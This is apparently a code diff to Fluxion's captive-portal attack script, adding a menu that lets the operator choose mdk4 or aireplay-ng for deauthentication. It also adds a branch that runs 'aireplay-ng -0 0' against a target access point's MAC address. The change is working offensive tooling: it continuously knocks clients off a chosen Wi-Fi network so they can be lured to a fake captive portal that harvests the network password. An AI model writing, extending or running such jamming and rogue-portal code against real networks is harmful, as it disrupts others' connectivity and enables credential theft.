@@ -154,6 +154,12 @@ function captive_portal_set_ap_service() {
 
   captive_portal_unset_ap_service
 
+echo -e "$FLUXIONVLine ${CClr}Select a method of deauthentication\n${CClr}"
+echo -e "${CSRed}[${CSYel}1${CSRed}]${CClr} mdk4${CClr}"
+echo -e "${CSRed}[${CSYel}2${CSRed}]${CClr} aireplay\n${CClr}"
+read -p $'\e[0;31m[\e[1;34mfluxion\e[1;33m@\e[1;37m'"$HOSTNAME"$'\e[0;31m]\e[0;31m-\e[0;31m[\e[1;33m~\e[0;31m] \e[0m' option_deauth
+
+
   if [ "$FLUXIONAuto" ]; then
     CaptivePortalAPService="hostapd"
   else
@@ -1519,14 +1525,20 @@ start_attack() {
         "./$FLUXIONWorkspacePath/captive_portal/deauth-ng.py -i $CaptivePortalJammerInterface -f 5 -c $FluxionTargetChannel -a $FluxionTargetMAC" &
     # Save parent's pid, to get to child later.
     CaptivePortalJammerServiceXtermPID=$!
-  else
+  elif [[ $option_deauth -eq 1 ]]; then
 
 	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
         -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
         "mdk4 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk4_blacklist.lst\"" &
         # Save parent's pid, to get to child later.
     	CaptivePortalJammerServiceXtermPID=$!
+  elif [[ $option_deauth -eq 2 ]]; then
 
+	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
+        -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
+        "aireplay-ng -0 0 -a $FluxionTargetMAC --ignore-negative-one $CaptivePortalJammerInterface" &
+        # Save parent's pid, to get to child later.
+    	CaptivePortalJammerServiceXtermPID=$!
   fi
 
   echo -e "$FLUXIONVLine $CaptivePortalStartingAuthenticatorServiceNotice"
